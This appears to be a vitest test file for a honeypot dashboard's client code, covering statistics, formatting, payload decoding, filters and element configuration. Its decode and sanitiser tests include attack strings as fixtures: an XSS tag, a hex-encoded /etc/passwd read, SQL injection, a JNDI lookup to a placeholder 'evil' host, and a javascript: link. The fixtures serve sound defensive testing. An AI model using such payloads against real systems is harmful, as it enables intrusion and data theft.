import { describe, expect, it } from "vitest";
import {
  analyze,
  cadence,
  chooseBucket,
  classOf,
  cooccurrence,
  funnel,
  histogram,
  ipRows,
  niceScale,
  pairKey,
  percentile,
  protoOf,
  ranked,
  rankedWithOther,
  responseClassEntries,
  rung,
  scopeIncidents,
  strongestResponse,
  uaOf,
} from "../src/dashboard/client/analysis.js";
import { decodeCandidates, looksInteresting, peel, tryBase64, tryHex, tryUrl } from "../src/dashboard/client/decode.js";
import { DASH, fmtCompact, fmtDur, fmtNum, fmtPct, fmtTime, hue, plural, sevClass, truncate } from "../src/dashboard/client/format.js";
import { detectorInfo, responseInfo } from "../src/dashboard/client/knowledge.js";
import { ordinalStep, sequentialStep, slot } from "../src/dashboard/client/palette.js";
import {
  availableTabs,
  explainFailure,
  incidentQuery,
  isIncident,
  matchesFilter,
  mergeIncident,
  parseMetrics,
  reconnectDelay,
  responseClass,
  safeHref,
  streamNotice,
  tabFromHash,
  withToken,
} from "../src/dashboard/client/query.js";
import type { ActorGroup as ClientActor, AttackSession as ClientSession, Boot, Incident, IocEntry as ClientIoc, StatsSummary as ClientStats } from "../src/dashboard/client/types.js";
import type { DashboardBootstrap } from "../src/dashboard/types.js";
import {
  cellText,
  checkDensity,
  checkScheme,
  crossOriginProblem,
  explainStatus,
  panelRows,
  parseMount,
  resolveSections,
  resolveView,
  shapeOf,
  tabOrder,
  tokenName,
  versionSkew,
} from "../src/element/config.js";
import type { ActorGroup, AttackSession, IocEntry, StatsSummary } from "../src/management/rest.js";
import type { HoneypotHit } from "../src/types.js";

/**
 * The dashboard client's pure modules and the element's decisions, in Node.
 *
 * The DOM half of the client is exercised by the page and element themselves; everything
 * that can be wrong without a document (bucketing, percentiles, decoding, filters, which
 * screens survive a config) is tested here directly.
 */

let counter = 0;
function incident(overrides: Partial<Incident> = {}): Incident {
  counter++;
  return {
    id: `i${counter}`,
    timestamp: new Date(Date.UTC(2026, 0, 1, 12, 0, counter)).toISOString(),
    ip: "203.0.113.1",
    method: "GET",
    path: "/.env",
    headers: { "user-agent": "sqlmap/1.7" },
    detections: [{ detectorId: "decoy-path", reason: "decoy", score: 10 }],
    score: 10,
    totalScore: 10,
    respondedWith: "decoy-content",
    ...overrides,
  };
}

describe("client types track the server's", () => {
  it("accepts every server shape without a cast", () => {
    // Compile-time: these assignments fail to type-check the day the shapes drift apart.
    const hit = incident() as unknown as HoneypotHit;
    const asClient: Incident = hit;
    const stats: ClientStats = {} as StatsSummary;
    const session: ClientSession = {} as AttackSession;
    const actor: ClientActor = {} as ActorGroup;
    const ioc: ClientIoc = {} as IocEntry;
    const boot: Boot = {} as DashboardBootstrap;
    expect([asClient, stats, session, actor, ioc, boot]).toHaveLength(6);
  });
});

describe("format", () => {
  it("formats durations at a readable precision", () => {
    expect(fmtDur(850)).toBe("850ms");
    expect(fmtDur(4200)).toBe("4.2s");
    expect(fmtDur(38_400)).toBe("38s");
    expect(fmtDur(12 * 60_000)).toBe("12m");
    expect(fmtDur(3.5 * 3_600_000)).toBe("3.5h");
    expect(fmtDur(50 * 3_600_000)).toBe("2.1d");
    expect(fmtDur(undefined)).toBe(DASH);
    expect(fmtDur(Number.NaN)).toBe(DASH);
  });

  it("formats shares, compact counts and plurals", () => {
    expect(fmtPct(1, 4)).toBe("25.0%");
    expect(fmtPct(1, 0)).toBe(DASH);
    expect(fmtCompact(12_345)).toBe("12.3K");
    expect(fmtCompact(2_500_000)).toBe("2.5M");
    expect(fmtCompact(0.5)).toBe("0.5");
    expect(fmtNum(undefined)).toBe(DASH);
    expect(plural(1, "incident")).toBe("1 incident");
    expect(plural(2, "incident")).toBe("2 incidents");
  });

  it("keeps a stable hue and severity, and truncates by code point", () => {
    expect(hue("decoy-path")).toBe(hue("decoy-path"));
    expect(hue("decoy-path")).toBeGreaterThanOrEqual(0);
    expect(hue("decoy-path")).toBeLessThan(360);
    expect(sevClass(40)).toBe("sev-high");
    expect(sevClass(15)).toBe("sev-mid");
    expect(sevClass(3)).toBe("sev-low");
    expect(truncate("abcdef", 4)).toBe("abc…");
    expect(truncate("\u{1F600}\u{1F600}\u{1F600}", 2)).toBe("\u{1F600}…");
    expect(fmtTime("not a date")).toBe(DASH);
  });
});

describe("analysis", () => {
  it("interpolates percentiles and handles the edges", () => {
    expect(percentile([], 0.5)).toBeUndefined();
    expect(percentile([7], 0.9)).toBe(7);
    expect(percentile([1, 2, 3, 4], 0.5)).toBe(2.5);
    expect(percentile([1, 2, 3, 4], 1)).toBe(4);
    expect(percentile([1, 2, 3, 4], 2)).toBe(4);
  });

  it("chooses buckets from the ladder and round axis scales", () => {
    expect(chooseBucket(10_000)).toBe(1000);
    expect(chooseBucket(3_600_000)).toBe(300_000);
    expect(chooseBucket(1e12)).toBe(864e5);
    expect(niceScale(0)).toEqual({ max: 1, step: 1, ticks: 1 });
    expect(niceScale(23)).toEqual({ max: 30, step: 10, ticks: 3 });
    expect(niceScale(9)).toEqual({ max: 10, step: 5, ticks: 2 });
    expect(niceScale(100).max).toBe(100);
  });

  it("ranks with stable ties and folds the tail into other", () => {
    const map = new Map([
      ["b", 2],
      ["a", 2],
      ["c", 5],
      ["d", 1],
    ]);
    expect(ranked(map)).toEqual([
      ["c", 5],
      ["a", 2],
      ["b", 2],
      ["d", 1],
    ]);
    expect(rankedWithOther(map, 3)).toEqual([
      ["c", 5],
      ["a", 2],
      ["other (2)", 3],
    ]);
  });

  it("classifies protocols, user agents and responses", () => {
    expect(protoOf(incident())).toBe("http");
    expect(protoOf(incident({ detections: [{ detectorId: "ssh-auth-bruteforce", reason: "", score: 1 }] }))).toBe("ssh");
    expect(uaOf(incident({ headers: {} }))).toBe("(none)");
    expect(uaOf(incident({ headers: { "user-agent": ["curl/8", "x"] } }))).toBe("curl/8");
    expect(rung("block")).toBe(3);
    expect(rung("tarpit")).toBe(2);
    expect(rung("fake-data")).toBe(1);
    expect(rung("not-found")).toBe(0);
    expect(classOf("ftp-capture")).toBe("protocol capture");
    expect(classOf("something-new")).toBe("silent 404");
    expect(strongestResponse(new Set(["not-found", "block", "tarpit"]))).toBe("block");
    expect(
      responseClassEntries(
        new Map([
          ["block", 2],
          ["decoy-content", 1],
          ["fake-data", 1],
        ]),
      ),
    ).toEqual([
      ["decoy", 2],
      ["block", 2],
    ]);
  });

  it("analyzes a corpus: counts, co-occurrence, gaps, buckets", () => {
    const base = Date.UTC(2026, 0, 1, 12, 0, 0);
    const list = [
      incident({ ip: "1.1.1.1", timestamp: new Date(base).toISOString(), detections: [{ detectorId: "a", reason: "", score: 5 }, { detectorId: "b", reason: "", score: 5 }], score: 10, totalScore: 10, fingerprint: "fp1" }),
      incident({ ip: "1.1.1.1", timestamp: new Date(base + 1000).toISOString(), detections: [{ detectorId: "a", reason: "", score: 5 }], score: 5, totalScore: 15, respondedWith: "block", fingerprint: "fp1" }),
      incident({ ip: "2.2.2.2", timestamp: new Date(base + 3000).toISOString(), detections: [{ detectorId: "b", reason: "", score: 2 }], score: 2, totalScore: 2, fingerprint: "fp1", body: "x=1" }),
      // Unparseable time: cannot be placed on a chart, so it is not counted.
      incident({ timestamp: "garbage" }),
    ];
    const a = analyze(list);
    expect(a.n).toBe(3);
    expect(a.byDetector.get("a")).toBe(2);
    expect(a.detectorScore.get("b")).toBe(7);
    expect(a.cooc.get(pairKey("b", "a"))).toBe(1);
    expect(a.multiDetector).toBe(1);
    expect(a.gaps).toEqual([1000]);
    expect(a.scores).toEqual([2, 5, 10]);
    expect(a.ips.get("1.1.1.1")?.peak).toBe(15);
    expect(a.ips.get("1.1.1.1")?.rung).toBe(3);
    expect(a.actors.get("fp1")?.ips.size).toBe(2);
    expect(a.span).toBe(3000);
    expect(a.buckets.reduce((sum, b) => sum + b.n, 0)).toBe(3);
    expect(a.buckets[a.buckets.length - 1]?.cumIps).toBe(2);
    expect(a.withBody).toBe(1);
    expect(funnel(a)).toEqual([2, 2, 1, 1]);
    const { top, get } = cooccurrence(a);
    expect(top).toEqual(["a", "b"]);
    expect(get(0, 0)).toBe(2);
    expect(get(0, 1)).toBe(1);
    expect(get(5, 5)).toBe(0);
    const rows = ipRows(a, { key: "incidents", dir: -1 }, 4);
    expect(rows.map((r) => r.ip)).toEqual(["1.1.1.1", "2.2.2.2"]);
    expect(rows[0]?.slots.reduce((x, y) => x + y, 0)).toBe(2);
    expect(ipRows(a, { key: "ip", dir: 1 }).map((r) => r.ip)).toEqual(["1.1.1.1", "2.2.2.2"]);
  });

  it("gives an empty analysis for an empty corpus", () => {
    const a = analyze([]);
    expect(a.n).toBe(0);
    expect(a.buckets).toEqual([]);
    expect(a.peakBucket).toBeUndefined();
    expect(histogram(a.scores)).toEqual([]);
    expect(cadence(a.gaps)).toBeUndefined();
  });

  it("scopes the window back from the newest incident, and by protocol", () => {
    const base = Date.UTC(2026, 0, 1);
    const old = incident({ timestamp: new Date(base).toISOString() });
    const recent = incident({ timestamp: new Date(base + 3_600_000).toISOString() });
    const ssh = incident({ timestamp: new Date(base + 3_600_001).toISOString(), detections: [{ detectorId: "ssh-scan", reason: "", score: 1 }] });
    expect(scopeIncidents([recent, old, ssh], 60_000, "").map((i) => i.id)).toEqual([recent.id, ssh.id]);
    expect(scopeIncidents([recent, old, ssh], 0, "http").map((i) => i.id)).toEqual([old.id, recent.id]);
  });

  it("bins cadence and scores", () => {
    const result = cadence([50, 50, 50, 50]);
    expect(result?.cv).toBe(0);
    expect(result?.verdict).toBe("machine-regular");
    expect(result?.counts[0]).toBe(4);
    expect(cadence([10, 100_000, 50, 900_000])?.verdict).toBe("irregular, human-like");
    const bins = histogram([0, 5, 9, 10, 99]);
    expect(bins).toHaveLength(10);
    expect(bins[bins.length - 1]?.to).toBe(100);
    expect(bins.reduce((sum, bin) => sum + bin.value, 0)).toBe(5);
  });
});

describe("decode", () => {
  it("peels layered encodings", () => {
    const inner = "<script>alert(1)</script>";
    const b64 = Buffer.from(inner).toString("base64");
    expect(tryBase64(b64)).toBe(inner);
    expect(peel(encodeURIComponent(b64))).toEqual({ decoded: inner, chain: ["url", "base64"] });
    expect(tryHex(Buffer.from("cat /etc/passwd").toString("hex"))).toBe("cat /etc/passwd");
    expect(tryUrl("no-escapes-here")).toBeUndefined();
    expect(tryUrl("%E0%A4%A")).toBeUndefined();
    expect(peel("plain")).toBeUndefined();
  });

  it("does not report a fingerprint or hex id as a payload", () => {
    expect(tryHex("a1b2c3d4e5f60718")).toBeUndefined();
    expect(looksInteresting("")).toBe(false);
  });

  it("finds candidates in query, headers, body and detector samples, deduplicated and bounded", () => {
    const payload = encodeURIComponent("' OR 1=1 --");
    const found = decodeCandidates(
      incident({
        path: `/login?user=${payload}&x=1`,
        headers: { "x-data": Buffer.from("${jndi:ldap://evil/a}").toString("base64") },
        body: `a=${payload}`,
        detections: [{ detectorId: "payload-injection", reason: "", score: 1, metadata: { sample: payload, ips: ["1.2.3.4"] } }],
      }),
    );
    // The body is read whole and as form pairs, which decode to different text.
    expect(found.map((row) => row.src)).toEqual(["query", "header x-data", "body", "body", "payload-injection sample"]);
    expect(found[1]?.decoded).toBe("${jndi:ldap://evil/a}");
    const many = Object.fromEntries(Array.from({ length: 40 }, (_, i) => [`h${i}`, encodeURIComponent(`value number ${i} <>`)]));
    expect(decodeCandidates(incident({ headers: many }))).toHaveLength(12);
  });

  it("ignores inherited metadata keys", () => {
    const metadata = Object.create({ sample: encodeURIComponent("inherited <payload>") }) as Record<string, unknown>;
    expect(decodeCandidates(incident({ path: "/", headers: {}, detections: [{ detectorId: "x", reason: "", score: 1, metadata }] }))).toEqual([]);
  });
});

describe("query", () => {
  const sections = { overview: true, incidents: false, statistics: true, sessions: false, actors: true, intel: true };

  it("lists and resolves tabs from sections and the hash", () => {
    expect(availableTabs(sections)).toEqual(["overview", "statistics", "actors", "intel"]);
    const available = availableTabs(sections);
    expect(tabFromHash("#actors", available)).toBe("actors");
    expect(tabFromHash("#stats", available)).toBe("statistics");
    expect(tabFromHash("#incidents", available)).toBe("overview");
    expect(tabFromHash("", [])).toBeUndefined();
  });

  it("builds incident queries and matches live incidents the same way", () => {
    expect(incidentQuery({ limit: 5000, detector: " decoy-path ", ip: "" })).toBe("limit=1000&detector=decoy-path");
    expect(incidentQuery({ limit: Number.NaN, detector: "", ip: "1.2.3.4" })).toBe("limit=100&ip=1.2.3.4");
    const hit = incident();
    expect(matchesFilter(hit, { limit: 1, detector: "decoy-path", ip: "203.0.113.1" })).toBe(true);
    expect(matchesFilter(hit, { limit: 1, detector: "other", ip: "" })).toBe(false);
    expect(matchesFilter(hit, { limit: 1, detector: "", ip: "9.9.9.9" })).toBe(false);
  });

  it("validates stream frames", () => {
    expect(isIncident(incident())).toBe(true);
    expect(isIncident({ ...incident(), detections: [{}] })).toBe(false);
    expect(isIncident({ ...incident(), score: "10" })).toBe(false);
    expect(isIncident(null)).toBe(false);
  });

  it("merges live incidents in order, without duplicates, within the cap", () => {
    const a = incident({ timestamp: "2026-01-01T00:00:01.000Z" });
    const b = incident({ timestamp: "2026-01-01T00:00:03.000Z" });
    const c = incident({ timestamp: "2026-01-01T00:00:02.000Z" });
    const merged = mergeIncident([a, b], c, 10);
    expect(merged.map((i) => i.id)).toEqual([a.id, c.id, b.id]);
    expect(mergeIncident(merged, c, 10)).toHaveLength(3);
    expect(mergeIncident(merged, incident({ timestamp: "2026-01-01T00:00:04.000Z" }), 2).map((i) => i.id)).toEqual([b.id, expect.any(String)]);
  });

  it("parses the unlabelled hackerpot series from a Prometheus exposition", () => {
    const text = "# HELP hackerpot_active_blocks x\nhackerpot_active_blocks 3\nhackerpot_tracked_ips 1.5e1\nhackerpot_hits_total{detector=\"a\"} 9\nother_metric 1\n";
    expect(parseMetrics(text)).toEqual({ active_blocks: 3, tracked_ips: 15 });
  });

  it("carries a token, keeps links to http, and backs off", () => {
    expect(withToken("/api/stats", "")).toBe("/api/stats");
    expect(withToken("/api/ioc?min_score=1", "a b")).toBe("/api/ioc?min_score=1&token=a%20b");
    expect(safeHref("javascript:alert(1)")).toBeUndefined();
    expect(safeHref(" https://runbook.example ")).toBe("https://runbook.example");
    expect(safeHref("/wiki")).toBe("/wiki");
    expect(safeHref("")).toBeUndefined();
    expect(reconnectDelay(0)).toBe(1000);
    expect(reconnectDelay(3)).toBe(8000);
    expect(reconnectDelay(99)).toBe(30_000);
  });

  it("explains failures by status", () => {
    expect(explainFailure(401, "/api/stats", "").kind).toBe("auth");
    expect(explainFailure(502, "/api/stats", "the dashboard's source could not answer: boom").detail).toContain("boom");
    expect(explainFailure(502, "/api/stats", "").kind).toBe("source");
    expect(explainFailure(404, "/api/ioc", "the intel section is switched off on this dashboard").kind).toBe("off");
    expect(explainFailure(503, "/api/events", "full").kind).toBe("busy");
    expect(explainFailure(0, "/api/stats", "Failed to fetch").kind).toBe("network");
    expect(explainFailure(500, "/api/stats", "").kind).toBe("other");
  });

  it("describes an incomplete feed, and only then", () => {
    expect(streamNotice(0, 0)).toBeUndefined();
    expect(streamNotice(1, 0)).toContain("1 incident dropped");
    expect(streamNotice(2, 5)).toContain("5 skipped");
  });

  it("turns a response id into a safe class name", () => {
    expect(responseClass("decoy-content")).toBe("resp-decoy-content");
    expect(responseClass('x" onload="y')).toBe("resp-xonloady");
  });
});

describe("palette and knowledge", () => {
  it("assigns slots in order and folds past the last", () => {
    expect(slot(0)).toBe("s1");
    expect(slot(7)).toBe("s8");
    expect(slot(8)).toBe("so");
    expect(slot(-1)).toBe("so");
    expect(sequentialStep(0, 10)).toBe(0);
    expect(sequentialStep(0.001, 10)).toBe(1);
    expect(sequentialStep(10, 10)).toBe(12);
    expect(ordinalStep(0)).toBe("o1");
    expect(ordinalStep(9)).toBe("o5");
  });

  it("does not resolve prototype keys as detectors or responses", () => {
    expect(detectorInfo("decoy-path")?.goal).toBeTruthy();
    expect(detectorInfo("constructor")).toBeUndefined();
    expect(responseInfo("__proto__")).toBeUndefined();
    expect(responseInfo("tarpit")?.does).toBeTruthy();
  });
});

describe("element config", () => {
  const server = { overview: true, incidents: true, statistics: true, sessions: true, actors: false, intel: true };

  it("combines server sections, hide and tabs, and explains what went missing", () => {
    const { sections, warnings } = resolveSections(server, { hide: { intel: true, stats: true } as never, tabs: [{ id: "overview" }, { id: "actors" }, { id: "intel" }, { id: "nope" as never }] });
    expect(sections).toEqual({ overview: true, incidents: false, statistics: false, sessions: false, actors: false, intel: false });
    expect(warnings.some((w) => w.startsWith("hide.stats"))).toBe(true);
    expect(warnings.some((w) => w.includes('"actors"') && w.includes("switched off"))).toBe(true);
    expect(warnings.some((w) => w.includes("hide wins"))).toBe(true);
    expect(warnings.some((w) => w.includes('"nope"'))).toBe(true);
    expect(resolveSections(undefined, {}).sections.intel).toBe(true);
  });

  it("orders tabs and resolves the opening view", () => {
    const { sections } = resolveSections(server, {});
    expect(tabOrder({ tabs: [{ id: "intel", label: "IOC" }, { id: "actors" }] }, sections)).toEqual([{ id: "intel", label: "IOC" }]);
    expect(resolveView({ tab: "actors", ip: " 1.2.3.4 " }, sections)).toEqual({ view: { ip: "1.2.3.4" }, warnings: [expect.stringContaining("view.tab")] });
    expect(resolveView(undefined, sections)).toEqual({ view: undefined, warnings: [] });
    expect(resolveView({ detector: "x" }, { ...sections, incidents: false }).warnings).toHaveLength(1);
  });

  it("parses the mount and refuses another origin", () => {
    expect(parseMount("/_hackerpot/")).toEqual({ base: "/_hackerpot" });
    expect(parseMount("/_hackerpot?token=abc").base).toBe("/_hackerpot");
    expect(parseMount("/_hackerpot?token=abc").warning).toContain("query string");
    expect(crossOriginProblem("/_hackerpot", "https://admin.example")).toBeUndefined();
    expect(crossOriginProblem("https://admin.example/_hp", "https://admin.example")).toBeUndefined();
    expect(crossOriginProblem("https://evil.example/_hp", "https://admin.example")).toContain("not this page's origin");
    expect(crossOriginProblem("//evil.example/_hp", "https://admin.example")).toContain("evil.example");
  });

  it("explains statuses, version skew and theme values", () => {
    expect(explainStatus(401, "/_hp")).toContain("sign in");
    expect(explainStatus(404, "/_hp")).toContain("/_hp/api/bootstrap");
    expect(explainStatus(418, "")).toBe("it answered 418");
    expect(versionSkew("1.0.0", "1.0.0", "/_hp")).toBeUndefined();
    expect(versionSkew("1.0.0", "0.9.0", "/_hp")).toContain("0.9.0");
    expect(versionSkew("1.0.0", undefined, "")).toContain("did not say");
    expect(tokenName("accent")).toBe("--accent");
    expect(tokenName("--panel-2")).toBe("--panel-2");
    expect(tokenName("x;background:url(a)")).toBeUndefined();
    expect(checkScheme("dark")).toEqual({ value: "dark" });
    expect(checkScheme("sepia").warning).toContain("sepia");
    expect(checkScheme(null)).toEqual({});
    expect(checkDensity("compact")).toEqual({ value: "compact" });
    expect(checkDensity("cozy").warning).toBeDefined();
  });

  it("compares configs by shape and renders cells and rows as bounded text", () => {
    const source = (): { rows: [] } => ({ rows: [] });
    expect(shapeOf({ tabs: [{ id: "overview" }], panels: [{ id: "a", screen: "overview", title: "A", source }] })).toBe(shapeOf({ tabs: [{ id: "overview" }], panels: [{ id: "a", screen: "overview", title: "A", source: () => ({ rows: [] }) }] }));
    expect(shapeOf({ hide: { intel: true } })).not.toBe(shapeOf({}));
    expect(cellText("<b>x</b>")).toBe("<b>x</b>");
    expect(cellText("x".repeat(500))).toHaveLength(200);
    expect(cellText({ a: 1 })).toBe('{"a":1}');
    expect(cellText(undefined)).toBe("");
    expect(panelRows({ rows: "nope" })).toBeUndefined();
    expect(panelRows(null)).toBeUndefined();
    const rows = panelRows({ rows: [{ label: "a", value: 1 }, { label: "no value" }, ...Array.from({ length: 250 }, (_, i) => ({ label: `r${i}`, value: i, note: "n" }))] });
    expect(rows?.rows).toHaveLength(200);
    expect(rows?.rows[0]).toEqual({ label: "a", value: "1" });
    expect(rows?.more).toBe(51);
  });
});
